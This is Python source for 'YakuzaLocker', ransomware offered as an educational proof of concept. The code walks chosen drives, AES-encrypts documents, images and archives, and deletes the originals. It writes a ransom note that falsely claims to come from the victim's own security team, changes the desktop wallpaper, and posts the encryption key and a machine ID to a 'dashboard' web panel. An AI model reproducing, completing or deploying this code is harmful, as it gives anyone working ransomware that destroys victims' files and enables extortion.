"""Main file of YakuzaLocker
Main file to Combine all Components of YakuzaLocker together
Author: Yakuza-D
Disclaimer: this app written only and only for educational purpose
"""


import sys
#import tkinter as tk
from tkinter import Toplevel, Entry, Label, Button

from os import makedirs, path, remove, walk
from ctypes import windll
import logging
from uuid import uuid4
from requests import post, exceptions
from time import sleep
from json import dumps
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from base64 import b64encode


""" Part 1: Application functions """


# Defining Function to load the current path of ransom.py and then join it to relative_path
def resource_path(relative_path):
    # Get Directory name of the current python file
    basePath = getattr(sys, '_MEIPASS', path.dirname(path.abspath(__file__)))

    # join relative_path to directory name of the current python file
    return path.join(basePath, relative_path)


# Create Function to Ensure the time Directory Exist
def ensure_time_dir_exist():
    if not path.exists(TIME_DIR):
        makedirs(TIME_DIR)


# Create Function to Load Machine ID from all drives on the machine
def load_machine_id():
    # Generate a list of all existence drives on the machine
    drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if path.exists(f"{x}:\\")]

    # Iterate through each drive and check if the Machine_id.txt file exists, then read its contents and return it
    for drive in drives:
        machineIdPath = path.join(drive, 'Machine_id.txt')
        if path.exists(machineIdPath):
            try:
                with open(machineIdPath, 'r') as file:
                    machineId = file.read().strip()
                    # debug print
                    print(f"[+] Debug: Machine Id loaded successfully from {machineIdPath}: {machineId}")
                    return machineId
            except FileNotFoundError:
                continue
    # debug print
    print(f"[-] Debug: Can't load machine id's, No valid Machine ID found. ")
    return None


""" Part 2: Define Global constants """
TERMINATION_KEY = "bingo"  # Termination keys used to close app and cancel Deleting Operation
# TERMINATION_KEY = "yakuza"
SECONDARY_TERMINATION_KEY = "stop"
# SECONDARY_TERMINATION_KEY = "davood"

# get the current user's home directory
HOME_DIR = path.expanduser('~')

# Create Path of Time Directory based on the current user's home directory
TIME_DIR = path.join(HOME_DIR, '.cryptolock_time')  # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')

# Create Path of a timer state file(timer_state.txt) which store in the TIME_DIR
TIMER_STATE_FILE = path.join(TIME_DIR, 'timer_state.txt')

# Path of application icons and images
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank_you.png")

""" Part 3: Define Encryption Configs as Global Constants """

# Ensure the time Directory Exists at the Start & Encryption Configs
ensure_time_dir_exist()

# You can customize choose the drives you want to encrypt
DRIVES_TO_ENCRYPT = ["F:", "E:"]

# File Extension to be encrypted, File Extension's can be customized based on a yor target
EXTENSION_TO_ENCRYPT = [".txt", ".jpg", ".png", ".pdf", ".zip", ".rar", ".xlsx", ".docx"]

# Password_PROVIDED used for Encryption Salt to Encryption be stronger
PASSWORD_PROVIDED = "PleaseGiveMeMoney"

# URL of Web Panel(Dashboard) of Ransom Tool
DASHBOARD_URL = "http://localhost/"

# Max Attempt to Enter a decryption key before deleting all encrypted Files
MAX_ATTEMPTS = 10

# Delay between each round of encrypted files Deleting
DELAY = 5

"""  Part 4: Setup Logging to Log the Encryption/Decryption Process in the Log Console """
logging.basicConfig(
    filename="encryption_log.txt",
    level=logging.INFO,
    format="%(asctime)s:%(levelname)s:%(message)s",
    filemode="w"
)

consoleHandler = logging.StreamHandler()
consoleHandler.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s:%(levelname)s:%(message)s")
consoleHandler.setFormatter(formatter)
logging.getLogger().addHandler(consoleHandler)


# Initialize Encryption Tool Class
class EncryptionTool:
    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay=5):
        self.drives = drives
        self.extensions = extensions
        self.password = password
        self.dashboard_url = dashboard_url
        self.max_attempts = max_attempts
        self.delay = delay
        self.key = self.generate_key(password) # noqa
        self.machine_id = str(uuid4())

    @staticmethod
    def generate_key(password):
        """ this function generates a key from the password as argument which is PASSWORD_PROVIDED
        :param: password
        :return: key
        """
        try:
            # Create 16 bytes Salt
            salt = get_random_bytes(16)

            # Create PBKDF2 Password with salt in 32 bytes
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)

            # Submit a info log message in Log Console
            logging.info("[+] Encryption: Encryption Key Generated Successfully. ")
            return key

        except Exception as e:
            # Submit a Error log message in Log Console
            logging.error(f"[-] Encryption: Encryption Key Generation Failed: Error {str(e)}")
            raise

    # Create Function to Set Wallpaper on the target machine after ransom running
    @staticmethod
    def set_wallpaper(wallpaper_path):
        try:
            windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
            logging.info(f"[+] Wallpaper Set Successfully to {wallpaper_path}. ")
        except Exception as e:
            logging.error(f"[-] Failed to set Wallpaper => Error: {str(e)}")

    # Function to Create Important Files on the target machine
    @staticmethod
    def create_important_files(directory_path):
        try:
            # Create a path of D-Data and then Create it if the D-Data directory doesn't exist
            dDataPath = path.join(directory_path, "D-Data")
            makedirs(dDataPath, exist_ok=True)

            # Filenames must be created with fileContents
            filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
            fileContents = ['Annual Report Content', 'Financial Data', 'Employee Contact Information']

            # Iterate on all filenames and file contents
            for filename, content in zip(filenames, fileContents):
                # join the filename path to the D-Data Directory path
                filepath = path.join(dDataPath, filename)

                # Create filename(important files) in the D-Data Directory
                with open(filepath, 'w') as file:
                    file.write(content)

            # Submit an Info Log message of Important files created
            logging.info(f"[+] Important Files Created Successfully in {dDataPath}.")
        except Exception as e:
            # Submit Error Log message from exception occurs
            logging.error(f"[-] Failed to create important files => Error: {str(e)}")

    # Create Function to Encrypt a Single File
    def encrypt_file(self, file_path):
        try:
            # Generate a 16-byte IV
            iv = get_random_bytes(16)

            # Create a Cipher object with key+iv on CBC Mode
            cipher = AES.new(self.key, AES.MODE_CBC, iv)

            # Open file_path in Read Binary Mode and then read file contents
            with open(file_path, 'rb') as file:
                fileData = file.read()

            # Encrypt fileData using the Cipher object with AES Algorithm
            encryptedData = cipher.encrypt(pad(fileData, AES.block_size))

            # Write the encryptedData + iv to a new file with .encrypted Extension
            with open(file_path + ".encrypted", 'wb') as file:
                file.write(iv + encryptedData)

            # Remove the Original file from target machine
            remove(file_path)

            # Submit an Info Log from encryption to Log Console
            logging.info(f"[+] Encrypting {file_path} ...")
        except Exception as e:
            # Submit an Error Log from encryption to Log Console
            logging.error(f"[-] Failed to encrypt {file_path} => Error: {str(e)}")

    # Function to Encrypt All Files in a Directory
    def encrypt_files_in_directory(self, directory_path):
        try:
            # Split root(parents) directory, directory and files in directory
            for root, dirs, files in walk(directory_path):

                # If the directory uses fore recycle bin, jump to for loop
                if "$RECYCLE.BIN" in root:
                    continue

                # Iterate on all files in directory, for each file in directory
                for file in files:
                    # if a file ends with each item defined in the extension list, then join filename to the root folder
                    # and then encrypt file using single file encrypt function => encrypt_file()

                    if any(file.endswith(ext) for ext in self.extensions):
                        # join a file to the root directory and then encrypt file using single file encrypt function
                        filePath = path.join(root, file)
                        self.encrypt_file(filePath)

            # Submit Info Log for files encryption in the Log Console
            logging.info(f"[+] All files in the {directory_path} Encrypted Successfully.")
        except Exception as e:
            # Submit Error Log for files encryption in the Log Console
            logging.error(f"[-] Failed to Encrypt files in {directory_path} => Error: {str(e)}")

    # Function to create a user manual
    def create_user_manual(self, directory_path):
        manualContent = f"""Dear User,
Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}
Please keep this machine ID safe. You will need it along with your decryption key to unlock your files.
In case of any issues or to obtain your decryption key, please contact your IT department or your system administrator for further details.
Thank you,
Your Security Team
"""
        manualPath = path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
        try:
            with open(manualPath, "w") as file:
                file.write(manualContent)
            logging.info(f"[+] User Manual Created Successfully in {directory_path}.")
        except Exception as e:
            logging.error(f"[-] Failed to create user manual. Error: {str(e)}")

    # Function to send the encryption key to the dashboard
    def send_key_to_dashboard(self):
        encoded_key = b64encode(self.key).decode('utf-8')
        payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
        headers = {'Content-Type': 'application/json'}

        for attempt in range(self.max_attempts):
            logging.info(f"Attempt {attempt + 1} to send encryption key.")
            try:
                response = post(self.dashboard_url, headers=headers, data=dumps(payload))
                if response.ok:
                    logging.info('Key sent successfully. Response OK.')
                    return True
                else:
                    logging.error(f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
            except exceptions.ConnectionError as e:
                logging.error(f"Connection error on attempt {attempt + 1}: {e}")
            if attempt < self.max_attempts - 1:
                sleep(self.delay)
        logging.error("All attempts to send the key failed.")
        return False

    # Function to save the encryption key locally
    def save_key_locally(self):
        # Create Hardcoded Path for saving key
        keyPath = path.join('E:', 'encryption_key.txt')
        try:
            makedirs(path.dirname(keyPath), exist_ok=True)

            # Write Machine id & Encryption key to keyPath file
            with open(keyPath, "w") as file:
                file.write(f"Machine ID: {self.machine_id}\n")
                file.write(f"Encryption Key: {b64encode(self.key).decode('utf-8')}\n")

            # Submit Info Log for the encryption key and the machine id saving
            logging.info(f"[+] Encryption Key Saved Locally in the {keyPath}.")
            return True
        except Exception as e:
            # Submit Error Log for Failed the encryption key and the machine id saving
            logging.error(f"[-] Failed to save the encryption key locally. Error: {str(e)}")
            return False

    # Function to save the machine ID
    def save_machine_id(self, directory_path):
        # Create Hardcoded Path for Machine_id.txt which store the machine id
        machineIdPath = path.join(directory_path, "Machine_id.txt")
        try:
            # Create directory_path if the directory doesn't exist
            makedirs(directory_path, exist_ok=True)

            # Open Machine_id.txt and write 'self.machine_id' to this file
            with open(machineIdPath, "w") as file:
                file.write(self.machine_id)

            # Submit Info Log for saving machine ID
            logging.info(f"[+] Machine ID Saved Successfully in {machineIdPath}.")

        except Exception as e:
            # Submit Error Log for Failed the encryption key and the machine id saving
            logging.error(f"[-] Failed to save the Machine ID locally. Error: {str(e)}")
            return False

    # Function to process a drive (create files, encrypt, etc.)
    def process_drive(self, drive):
        self.create_important_files(drive)
        self.encrypt_files_in_directory(drive)
        self.create_user_manual(drive)
        self.save_machine_id(drive)

    # Final Execution Function on all drives
    def execute(self):
        """Execute the process_drive() on the all Drives,
         and then save the encryption key locally,
         after that set wallpaper on the target machine"""

        # Iterate on all drives and then process_drive()
        for drive in self.drives:
            logging.info(f"[+] Processing Drive: {drive}")
            self.process_drive(drive)

        # Save the encryption key locally
        if self.save_key_locally():
            logging.info("[+] Encryption Key Locally Saved Successfully.")
        else:
            logging.error("[-] Failed to Save the Encryption Key Locally.")

        # create Path of wallpaper & Set wallpaper on the target machine
        wallpaperPath = resource_path("img/wallpaper.png")

        self.set_wallpaper(wallpaperPath) # noqa
        logging.info("[+] Wallpaper Set Successfully.")
        logging.info("[+] Encryption Process Completed. All files now encrypted.")

# Define Termination Key Dialog class for user interactions
class TerminationKeyDialog(Toplevel):
    """ in this class, we have a dialog box to get the termination key from the user
    to user can exit from the ransom """

    def __init__(self, parent, icon_path):
        super().__init__(parent)

        # Set Icon, title and geometry
        self.iconbitmap(icon_path)
        self.title("Termination Key")
        self.geometry("300x100")

        # Initialize the result attribute, Termination Key give from Entry save to the result
        self.result = None
        # Label to show this message => Enter the termination key to Exit
        Label(self, text="Enter the termination key to Exit:").pack(pady=5)

        # Entry for user, to give the termination key from user
        self.keyEntry = Entry(self)
        self.keyEntry.pack(pady=5)
        self.keyEntry.focus_set()

        # when click on this, self.result == self.keyEntry.get()
        Button(self, text="Submit", command=self.on_submit).pack(pady=5)

    def on_submit(self):
        self.result = self.keyEntry.get()
        self.destroy()







if __name__ == "__main__":
    # Create an instance of the EncryptionTool class
    encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
                                    password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
    encryptionTool.create_important_files(r"H:/Repo/RansomPOC")
    encryptionTool.encrypt_files_in_directory(r"H:/Repo/RansomPOC/D-Data")

